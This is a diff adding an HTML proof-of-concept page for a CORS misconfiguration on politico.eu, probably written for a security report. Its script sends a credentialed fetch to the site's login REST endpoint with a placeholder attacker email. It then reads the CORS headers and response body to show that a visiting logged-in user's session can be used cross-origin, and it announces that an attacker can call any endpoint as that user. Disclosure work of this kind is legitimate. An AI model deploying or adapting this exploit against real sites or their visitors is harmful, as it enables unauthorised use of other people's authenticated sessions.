@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head><title>CORS PoC – politico.eu</title></head>
+<body>
+<pre id="out">Running…</pre>
+<script>
+fetch(
+  'https://www.politico.eu/wp-json/politico/v1/user-login-flow' +
+  '?email=probe%40attacker.com&login-token=d372dda3a6&turnstile-response=invalid',
+  { credentials: 'include', headers: { Accept: 'application/json' } }
+)
+.then(r => {
+  const out = document.getElementById('out');
+  out.textContent += 'ACAO: ' + r.headers.get('Access-Control-Allow-Origin') + '\n';
+  out.textContent += 'ACAC: ' + r.headers.get('Access-Control-Allow-Credentials') + '\n';
+  return r.json();
+})
+.then(body => {
+  const out = document.getElementById('out');
+  out.textContent += 'Body: ' + JSON.stringify(body) + '\n';
+  if (body.result === 'invalid_token') {
+    out.textContent += '[!] Victim IS logged in – attacker can now call any REST endpoint as this user.';
+  } else {
+    out.textContent += 'Victim not logged in (or SameSite blocked auth cookie in this browser).';
+  }
+});
+</script>
+</body>
+</html>
